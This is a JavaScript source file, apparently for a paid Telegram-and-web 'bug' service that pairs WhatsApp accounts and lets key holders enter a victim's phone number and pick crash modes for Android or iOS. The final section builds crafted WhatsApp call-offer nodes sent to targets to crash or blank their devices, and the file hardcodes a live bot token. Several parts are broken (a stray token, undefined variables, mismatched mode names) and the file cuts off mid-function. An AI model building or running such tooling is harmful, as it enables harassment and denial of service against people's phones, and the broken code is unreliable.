// ==================== MODULE IMPORTS ==================== //
const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const AdmZip = require("adm-zip");
const tar = require("tar");
const os = require("os");
const fse = require("fs-extra");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');

// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = "8321470207:AAHct2zG0GeDBPnc7laU4qNepaYBZc4EEpg";
const OWNER_ID = "7537228352";
const bot = new Telegraf(BOT_TOKEN);
const { domain, port } = require("./database/config");
const app = express();

// ==================== GLOBAL VARIABLES ==================== //
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const cooldowns = {}; // key: username_mode, value: timestamp
let DEFAULT_COOLDOWN_MS = 5 * 60 * 1000; // default 5 menit
let userApiBug = null;
let sock;

// ==================== UTILITY FUNCTIONS ==================== //
function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
}

// User management functions
function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

function parseDuration(str) {
  if (!str || typeof str !== "string") return null;
  
  const match = str.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value * 1000;            // detik → ms
    case "m": return value * 60 * 1000;       // menit → ms
    case "h": return value * 60 * 60 * 1000;  // jam → ms
    case "d": return value * 24 * 60 * 60 * 1000; // hari → ms
    default: return null;
  }
}

// ==================== GLOBAL COOLING SYSTEM ==================== //
// WhatsApp connection utilities
const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

// ==================== WHATSAPP CONNECTION HANDLERS ==================== //

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "BEJO1234");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "Markdown",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};
// ==================== BOT COMMANDS ==================== //

// Start command
bot.command("start", (ctx) => {
  const teks = `( 🩸 ) ─── ❖ 情報 ❖  
𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 × 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺  
─── 革命的な自動化システム ───  
高速・柔軟性・絶対的な安全性を備えた 次世代ボットが今、覚醒する。

<b>「𖥂」𝐎𝐧𝐞 𝐕𝐚𝐫𝐬𝐞「𖥂」</b>
<b>𖤓 𝐎𝐰𝐧𝐞𝐫 : @𝗢𝗻𝗩𝗲𝗿𝘀𝘀𝟯</b>
𖤓 𝐎𝐰𝐧𝐞𝐫² : @𝙥𝙞𝙣𝙯𝙮𝙮𝙮𝙮15
𖤓 𝐕𝐞𝐫𝐬𝐢 𝐀𝐩𝐤 : 𝟱.𝟬
𖤓 𝐒𝐭𝐚𝐭𝐮𝐬 𝐀𝐩𝐤 : 𝙑𝙞𝙥

┌─────────
├──── ▢ ( 𖣂 ) Sender Handler
├── ▢ owner users
│── /addbot — <nomor>
│── /listsender —
│── /delbot — <nomor>
│── /add — <cards.json>
└────
┌─────────
├──── ▢ ( 𖣂 ) Key Manager
├── ▢ admin users
│── /ckey — <username,durasi>
│── /listkey —
│── /delkey — <username>
└────
┌─────────
├──── ▢ ( 𖣂 ) Access Controls
├── ▢ owner users
│── /addreseller — <user/id>
│── /delreseller — <user/id>
│── /addowner — <user/id>
│── /delowner — <user/id>
│── /setjeda — <1m/1d/1s>
└────`;

  ctx.replyWithPhoto(
    { url: "start.jpg" },
    {
      caption: teks,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "👤「DEV UTAMA」", url: "https://t.me/OnVerss3" },
            { text: "👤「DEV²」", url: "https://t.me/pinzyyyy15" }
          ]
        ]
      }
    }
  );
});

// Sender management commands
bot.command("addbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }

  if (args.length < 2) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addbot Number_\n_Example : /addbot 628xxxx_", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  ctx.reply(`*Daftar Sender Aktif:*\n${[...sessions.keys()].map(n => `• ${n}`).join("\n")}`, 
    { parse_mode: "Markdown" });
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (args.length < 2) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delsender Number_\n_Example : /delsender 628xxxx_", { parse_mode: "Markdown" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✅ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

// Helper untuk cari creds.json
async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

// ===== Command /add =====
bot.command("add", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.document) {
    return ctx.reply("❌ Balas file session dengan `/add`");
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session yang valid (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session…");

  try {
    const link = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(link.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = sessionPath(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActive(botNumber);

    await connectToWhatsApp(botNumber, ctx.chat.id, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan & online.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error add session:", err);
    return ctx.reply(`❌ Gagal memproses session.\nError: ${err.message}`);
  }
});

// Key management commands
bot.command("ckey", (ctx) => {
  const userId = ctx.from.id.toString();
  const args   = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.telegram.sendMessage(
      userId,
      "[ ! ] - ONLY ACCES USER\n—Please register first to access this feature."
    );
  }
  
  if (!args || !args.includes(",")) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ *Syntax Error!*\n\n_Use : /ckey User,Day_\n_Example : /ckey rann,30d",
      { parse_mode: "Markdown" }
    );
  }

  const [username, durasiStr] = args.split(",");
  const durationMs            = parseDuration(durasiStr.trim());
  if (!durationMs) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h"
    );
  }

  const key     = generateKey(4);
  const expired = Date.now() + durationMs;
  const users   = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year    : "numeric",
    month   : "2-digit",
    day     : "2-digit",
    hour    : "2-digit",
    minute  : "2-digit",
    timeZone: "Asia/Jakarta"
  });

  // Kirim detail ke user (DM)
  ctx.telegram.sendMessage(
    userId,
    `✅ *Key berhasil dibuat:*\n\n` +
    `🆔 *Username:* \`${username}\`\n` +
    `🔑 *Key:* \`${key}\`\n` +
    `⏳ *Expired:* _${expiredStr}_ WIB\n\n` +
    `*Note:*\n- Jangan di sebar\n- Jangan Di Freekan\n- Jangan Di Jual Lagi`,
    { parse_mode: "Markdown" }
  ).then(() => {
    // Setelah terkirim → kasih notifikasi di group
    ctx.reply("✅ Success Send Key");
  }).catch(err => {
    ctx.reply("❌ Gagal mengirim key ke user.");
    console.error("Error kirim key:", err);
  });
});

bot.command("listkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🕸️ *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey rann");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`❌ Username \`${username}\` not found.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✅ Key belonging to *${username}* was successfully deleted.`, { parse_mode: "Markdown" });
});

// Access control commands
bot.command("addreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addreseller Id_\n_Example : /addreseller 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User already has reseller.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Reseller granted to ID: ${id}`);
});

bot.command("delreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delreseller Id_\n_Example : /delreseller 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("❌ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✅ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("❌ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✅ Owner ID ${id} was successfully deleted.`);
});

// ================== COMMAND /SETJEDA ================== //
bot.command("setjeda", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]; 
  const ms = parseDuration(input);

  if (!ms) {
    return ctx.reply("❌ Format salah!\nContoh yang benar:\n- 30s (30 detik)\n- 5m (5 menit)\n- 1h (1 jam)\n- 1d (1 hari)");
  }

  globalThis.DEFAULT_COOLDOWN_MS = ms;
  DEFAULT_COOLDOWN_MS = ms; // sync ke alias lokal juga

  ctx.reply(`✅ Jeda berhasil diubah jadi *${input}* (${ms / 1000} detik)`);
});

// ==================== BOT INITIALIZATION ==================== //
console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⢤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡼⠋⠀⣀⠄⡂⠍⣀⣒⣒⠂⠀⠬⠤⠤⠬⠍⠉⠝⠲⣄⡀⠀⠀
⠀⠀⠀⢀⡾⠁⠀⠊⢔⠕⠈⣀⣀⡀⠈⠆⠀⠀⠀⡍⠁⠀⠁⢂⠀⠈⣷⠀⠀
⠀⠀⣠⣾⠥⠀⠀⣠⢠⣞⣿⣿⣿⣉⠳⣄⠀⠀⣀⣤⣶⣶⣶⡄⠀⠀⣘⢦⡀
⢀⡞⡍⣠⠞⢋⡛⠶⠤⣤⠴⠚⠀⠈⠙⠁⠀⠀⢹⡏⠁⠀⣀⣠⠤⢤⡕⠱⣷
⠘⡇⠇⣯⠤⢾⡙⠲⢤⣀⡀⠤⠀⢲⡖⣂⣀⠀⠀⢙⣶⣄⠈⠉⣸⡄⠠⣠⡿
⠀⠹⣜⡪⠀⠈⢷⣦⣬⣏⠉⠛⠲⣮⣧⣁⣀⣀⠶⠞⢁⣀⣨⢶⢿⣧⠉⡼⠁
⠀⠀⠈⢷⡀⠀⠀⠳⣌⡟⠻⠷⣶⣧⣀⣀⣹⣉⣉⣿⣉⣉⣇⣼⣾⣿⠀⡇⠀
⠀⠀⠀⠈⢳⡄⠀⠀⠘⠳⣄⡀⡼⠈⠉⠛⡿⠿⠿⡿⠿⣿⢿⣿⣿⡇⠀⡇⠀
⠀⠀⠀⠀⠀⠙⢦⣕⠠⣒⠌⡙⠓⠶⠤⣤⣧⣀⣸⣇⣴⣧⠾⠾⠋⠀⠀⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠶⣭⣒⠩⠖⢠⣤⠄⠀⠀⠀⠀⠀⠠⠔⠁⡰⠀⣧⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠲⢤⣀⣀⠉⠉⠀⠀⠀⠀⠀⠁⠀⣠⠏⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠒⠲⠶⠤⠴⠒⠚⠁
╭╮╱╭┳━━━┳━━━┳╮╱╱╭━━━┳━━━┳━╮╱╭┳━━━╮
┃┃╱┃┃╭━╮┃╭━╮┃┃╱╱┃╭━╮┃╭━╮┃┃╰╮┃┃╭━╮┃
┃╰━╯┃┃╱┃┃╰━━┫┃╱╱┃┃╱┃┃┃╱┃┃╭╮╰╯┃┃╱┃┃
┃╭━╮┃┃╱┃┣━━╮┃┃╱╭┫┃╱┃┃┃╱┃┃┃╰╮┃┃┃╱┃┃
┃┃╱┃┃╰━╯┃╰━╯┃╰━╯┃╰━╯┃╰━╯┃┃╱┃┃┃╰━╯┃
╰╯╱╰┻━━━┻━━━┻━━━┻━━━┻━━━┻╯╱╰━┻━━━╯⠀⠀⠀⠀⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─☐ BOT VORLEX V4.1 DB
├─ ID OWN : ${OWNER_ID}
├─ DEVELOPER : BEJO 
├─ MY SUPPORT : ALLAH 
├─ BOT : CONNECTED ✅
╰───────────────────`));

initializeWhatsAppConnections();

// ==================== WEB SERVER ==================== //
// ==================== WEB SERVER ==================== //
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./HCS-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

// == TEMPAT PENGIRIMAN BUG == \\
// sesuaiin aja ama pemanggilan func tadi / combo
            try {
        if (mode === "android") {
          androcrash(24, target);
        } else if (mode === "ios") {
          Ipongcrash(24, target);
        } else if (mode === "crash") {
          crashdevice(24, target);
        } else if (mode === "blank") {
          Blankdevice(24, target);
        } else {
          throw new Error("Mode tidak dikenal.");
        }
androdelay
      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(port, () => {
  console.log(`🚀 Server aktif di ${domain}:${port}`);
});

// ==================== EXPORTS ==================== //
module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};


// ====== TEMPAT FUNCTION BUGS ====== //

async function callWithNode(XNumber) {
    let devices = (
        await sock.getUSyncDevices([XNumber], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let createMutex = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let mutexManager = createMutex();
    let randomKey = crypto.randomBytes(32);
    let randomKeyWithFlag = Buffer.concat([randomKey, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let callNode = {
        tag: "call",
        attrs: {
            to: XNumber,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };

    await sock.sendNode(callNode);
    await sleep(5000)
}
async function Vcs(X){
    const CobaIni = {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    let devices = (
        await zebuild.getUSyncDevices([X], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await zebuild.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = zebuild.createParticipantNodes.bind(CobaIni);
    let yntkts = zebuild.encodeWAMessage?.bind(CobaIni);

    zebuild.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (zebuild.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = zebuild.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
